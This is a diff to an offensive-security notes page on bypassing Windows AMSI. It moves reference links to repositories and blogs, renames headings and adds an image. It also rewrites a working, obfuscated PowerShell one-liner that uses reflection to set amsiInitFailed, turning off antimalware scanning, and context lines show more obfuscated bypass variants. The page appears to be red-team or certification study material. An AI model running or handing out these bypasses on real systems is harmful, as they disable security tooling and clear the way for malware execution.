@@ -4,26 +4,17 @@ description: Antimalware Scan Interface (AMSI) Bypass
 
 # AMSI Bypass
 
-### Resource
-
-* https://github.com/sinfulz/JustEvadeBro
-* https://s3cur3th1ssh1t.github.io/Bypass\_AMSI\_by\_manual\_modification/
-* https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
-* https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/
-* https://github.com/ASP4RUX/AMSI-Patch
-* [https://github.com/anonymous300502/Nuke-AMSI](https://github.com/anonymous300502/Nuke-AMSI)
-
 ### AMSI Patch
 
-* [https://github.com/ASP4RUX/AMSI-Patch](https://github.com/ASP4RUX/AMSI-Patch)
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn9RdQYNznIixLFSfvlM5q4CmArqalAyo3jKwha5p8CE_0BS791sHB4FMjOe7PUsFfcWYFdgd4084wzlHj5qi7ouMYhOkpa13aoo0ZJNAsSPMnVMUOJTeaBdAX6_j-YhKLfTj39zdJAyDzUovLrSLBko2cuuQiHesdVp-PWBacPIIQVB9MN0P-vJ_ocKY/s1000" alt=""><figcaption><p>AMSI Patch</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```csharp
-$x = 'si'; $c = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $c, $x)); $z = $Ref.GetField(('am{0}InitFailed' -f $x),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)
+[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f 'Am', 'si')).GetField(('am{0}InitFailed' -f 'si'),'NonPublic,Static').("Set" + "Value")($null,$true)
 ```
 {% endcode %}
 
-### CRTP Module
+### From CRTP Module
 
 {% code overflow="wrap" %}
 ```csharp
@@ -31,7 +22,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')
 ```
 {% endcode %}
 
-### Modified
+### Manual Modification
 
 {% code overflow="wrap" %}
 ```csharp
@@ -168,3 +159,11 @@ Write-Host "$TimeElapsed seconds"
 MagicBypass
 
 ```
+
+### Resource
+
+* https://github.com/sinfulz/JustEvadeBro
+* https://s3cur3th1ssh1t.github.io/Bypass\_AMSI\_by\_manual\_modification/
+* https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+* https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/
+* https://github.com/anonymous300502/Nuke-AMSI
